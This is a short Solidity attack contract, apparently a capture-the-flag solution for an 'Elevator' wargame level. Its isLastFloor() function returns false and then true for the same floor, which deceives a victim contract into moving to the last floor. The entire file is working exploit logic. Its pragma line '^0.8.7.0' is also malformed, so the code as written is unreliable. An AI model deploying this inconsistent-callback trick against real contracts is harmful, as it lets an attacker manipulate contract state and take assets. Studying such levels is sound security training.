// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7.0;

interface Elevator {
  function goTo(uint _floor) external;
}

contract Building {
    address public victim;
    uint public last = 8;
    bool public firstTry = true;

    constructor(address _victim) {
        victim = _victim;
    }

    function goToLast() public {
        Elevator(victim).goTo(last);
    }

    // only the second time you call this function 
    // with a valid last floor will return true
    function isLastFloor(uint floor) public returns (bool) {
        if (floor == last) {
            if (firstTry) {
                // sets the first try variable 
                // to false and returns false
                firstTry = false;
                return false;
            } else {
                // resets the first try variable
                // and returns true
                firstTry = true;
                return true;
            }
        }
        // defaults to false
        return false;
    }

}